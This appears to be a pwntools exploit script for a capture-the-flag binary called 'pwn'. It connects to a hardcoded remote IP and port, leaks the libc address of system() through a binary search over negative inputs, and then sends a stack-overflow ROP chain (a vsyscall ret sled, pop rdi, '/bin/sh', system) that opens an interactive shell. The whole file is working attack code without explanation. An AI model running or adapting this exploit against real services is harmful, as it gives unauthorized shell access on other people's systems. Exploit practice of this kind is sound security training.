#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 45697)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    #p = process('./pwn')
    p = remote('localhost', 8888)
    libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Choice:', str(index))

def start(first, more):
    menu(1)
    p.sla('How many levels?', str(first))
    p.sla('Any more?\n', str(more))

def leak():
    l, r = 0, 0x7fffffffffff
    while l < r - 1:
        mid = (l + r) // 2
        try:
            menu(2)
        except:
            exit(-1)
        start(-1, -mid)
        message = p.rl()
        if 'Coward' in message:
            r = mid
        elif 'go!' in message or 'real' in message:
            l = mid
            offset = 56
            payload = flat(['a' * offset, '\xd0\x49'])
            p.sa('Ans', payload)
    return r

if __name__ == '__main__':
    system_addr = leak()
    success('sys ' + hex(system_addr))
    libc.address = system_addr - libc.sym['system']
    pop_rdi_ret = libc.address + 0x0000000000021102
    bin_sh_addr = libc.address + 0x18cd57
    start(10, 10)
    offset = 56
    #payload = flat(['a' * offset, pop_rdi_ret, bin_sh_addr, libc.sym['system']])
    #bc(libc.sym['system'])
    vsyscall_addr = 0xffffffffff600000
    payload = flat(['a' * offset, vsyscall_addr, vsyscall_addr, pop_rdi_ret, bin_sh_addr, libc.sym['system']])
    #gogogo()
    p.sa('Ans', payload)
    p.i()
